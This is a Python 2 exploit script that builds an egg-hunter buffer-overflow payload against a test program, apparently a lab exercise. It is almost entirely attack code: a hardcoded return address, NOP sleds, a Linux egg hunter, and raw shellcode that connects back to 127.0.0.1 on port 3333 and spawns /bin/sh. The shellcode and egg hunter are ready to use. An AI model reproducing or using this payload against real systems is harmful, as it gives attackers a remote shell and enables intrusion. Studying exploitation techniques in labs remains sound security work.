#!/usr/bin/python
"""
    Author: Mutti K
    Purpose: print exploit code to trigger vulnerability in test program which demonstrates egg hunter shellcode.
    The expected output is two strings in the following format "[egg][sled][shellcode] [sled][egghunter][eip][buffer].
    I calculated the sizes for parts of the payload to make it easier to drop in new shellcode of varying sizes.
"""
eip = "\xb4\xf1\xff\xbf"
egg_sig = "\x90\x50\x90\x50"
egg = egg_sig + egg_sig
buffer = "A"*64

shellcode_payload_max_size = 500
exploit_payload_max_size = 148
payload_max_size = 649

shellcode = \
"\x31\xc0\x31\xdb\x31\xc9\xb0\x66" \
"\xb3\x01\x51\x6a\x01\x6a\x02\x89" \
"\xe1\xcd\x80\x89\xc6\x31\xc0\x31" \
"\xdb\x31\xc9\xb0\x66\xb3\x03\x51" \
"\x51\xb9\xff\xff\xff\xff\x81\xe9" \
"\xfe\xff\xff\x80\x0f\xc9\x51\x66" \
"\x68\x0d\x05\x66\x6a\x02\x89\xe7" \
"\x6a\x10\x57\x56\x89\xe1\xcd\x80" \
"\x31\xc0\x31\xdb\x31\xc9\xb0\x3f" \
"\x89\xf3\xcd\x80\x31\xc0\x31\xdb" \
"\x31\xc9\xb0\x3f\xb1\x01\x89\xf3" \
"\xcd\x80\x31\xc0\x31\xdb\x31\xc9" \
"\xb0\x3f\xb1\x02\x89\xf3\xcd\x80" \
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2" \
"\x52\x68\x2f\x2f\x73\x68\x68\x2f" \
"\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"

shellcode_nopsled = "\x90"*(shellcode_payload_max_size - (len(egg)+len(shellcode)) )#Ensure buffer size is consistent
shellcode_payload = egg + shellcode_nopsled + shellcode
shellcode_size = len(shellcode_payload)

egg_hunter = \
"\xfc\x31\xd2\x31\xc9\x66\x81\xca" \
"\xff\x0f\x42\x8d\x5a\x04\x6a\x21" \
"\x58\xcd\x80\x3c\xf2\x74\xee\xb8" + egg_sig + \
"\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7"
exploit_nopsled = "\x90"*(exploit_payload_max_size - (len(eip)+len(egg_hunter) +len(buffer)) )#Ensure buffer size is consistent
exploit_payload = exploit_nopsled + egg_hunter + eip + buffer 
payload = shellcode_payload + " " + exploit_payload

payload_final_size = len(payload)
exploit_payload_size = len(exploit_payload)

""" Help with debugging
print "Payload max size " + str(payload_max_size) + " bytes"
print "Payload final size " + str(payload_final_size) + " bytes"
print "Exploit payload max size " + str(exploit_payload_max_size) + " bytes"
print "Exploit final size " + str(exploit_payload_size) + " bytes"
print "Shellcode payload max size " + str(shellcode_payload_max_size) + " bytes"
print "Shellcode final size " + str(shellcode_size) + " bytes"
""" 

print payload
